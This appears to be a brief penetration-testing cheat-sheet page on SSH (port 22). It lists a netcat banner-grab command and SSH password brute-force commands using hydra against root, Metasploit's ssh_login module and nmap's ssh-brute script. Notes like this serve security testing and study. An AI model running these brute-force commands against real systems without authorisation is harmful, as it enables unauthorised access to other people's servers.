---
description: >-
  The Secure Shell Protocol is a cryptographic network protocol for operating
  network services securely over an unsecured network.
---

# 22 - SSH

## general in ssh

```bash
nc $IP 22            # banner grabbing
```

## ssh brute-force

```bash
hydra -l "root" -P /wordlists/password.txt $IP ssh                          
auxiliary/scanner/ssh/ssh_login                                             
nmap -p22 --script=ssh-brute --script-args userdb=/wordlists/user.txt $IP   
```
